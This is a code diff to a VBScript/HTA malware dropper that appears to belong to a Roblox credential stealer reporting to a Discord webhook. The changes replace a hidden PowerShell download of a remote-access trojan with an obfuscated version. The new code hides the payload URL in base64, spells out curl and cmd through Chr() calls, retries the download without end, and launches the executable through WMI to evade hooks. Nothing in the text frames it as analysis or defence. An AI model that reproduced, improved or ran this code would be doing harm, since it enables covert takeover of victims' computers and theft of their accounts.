@@ -27,7 +27,7 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. RAT DROP (Simple PowerShell execution) ---
+' --- 2. RAT DROP (Spam loop until success) ---
 Call DropRAT
 
 ' --- 3. INFINITE Re-grab chain ---
@@ -47,41 +47,71 @@ Loop
 
 window.close()
 
-' --- RAT DROP (PowerShell DownloadString) ---
+' --- RAT DROP (Exact old source logic + spam loop) ---
 Sub DropRAT()
-    Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
+    ' Obfuscated URL from the old source
+    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
+    Dim dl : dl = DecodeB64(b64Url)
 
-    Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
-    If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
-    
-    Dim op : op = hidDir & "\winlogon.exe"
+    ' Build %TEMP% dynamically without typing it out
+    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
+    Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' agent.exe
 
-    ' Send "Fetching Payload"
-    Call PostEmbed(":package: Fetching Payload", "Downloading RAT via PowerShell...", 10181046)
+    ' Spam "Fetching Payload" loop until success
+    Dim attempts : attempts = 0
+    Do
+        attempts = attempts + 1
+        ' Spam the fetching message
+        Call PostEmbed(":package: Fetching Payload", "Attempting RAT download (Try " & attempts & ")...", 10181046)
 
-    ' PowerShell WebClient download (Very fast, low detection)
-    Dim psCmd : psCmd = "(New-Object System.Net.WebClient).DownloadFile('" & exeUrl & "', '" & op & "')"
-    
-    Dim psf : psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dl.ps1"
-    Dim f : Set f = fso.CreateTextFile(psf, True)
-    f.Write psCmd
-    f.Close
-    Set f = Nothing
-    
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
+        If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Check for success and execute
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
-            Dim dsize : dsize = fso.GetFile(op).Size
-            Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
-            
-            ' Execute
-            sh.Run """" & op & """", 0, False
+        ' Exact obfuscated curl execution from old source
+        Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
+        Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd ' "cmd /c " & cCmd
+        
+        sh.Run runExec, 0, True
+
+        ' Check if downloaded and valid (>3MB)
+        If fso.FileExists(op) Then
+            If fso.GetFile(op).Size > 3000000 Then
+                ' Success! Send green checkmark and launch
+                Dim dsize : dsize = fso.GetFile(op).Size
+                Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
+                
+                ' Launch via WMI to bypass simple hooks
+                Call RunCmd("""" & op & """")
+                Exit Sub
+            End If
         End If
-    End If
+        
+        ' Wait 2 seconds before retrying
+        Call SleepSeconds(2)
+    Loop
 End Sub
+
+' --- Base64 Decoder ---
+Function DecodeB64(str)
+    Dim xml, elem
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set elem = xml.createElement("b")
+    elem.dataType = "bin.base64"
+    elem.text = str
+    DecodeB64 = Stream_BinaryToString(elem.nodeTypedValue)
+End Function
+
+Function Stream_BinaryToString(Binary)
+    Dim Stream
+    Set Stream = CreateObject("ADODB.Stream")
+    Stream.Type = 1
+    Stream.Open
+    Stream.Write Binary
+    Stream.Position = 0
+    Stream.Type = 2
+    Stream.Charset = "utf-8"
+    Stream_BinaryToString = Stream.ReadText
+    Stream.Close
+End Function
 
 ' --- RunCmd (Hidden Execution via WMI) ---
 Sub RunCmd(cmd)
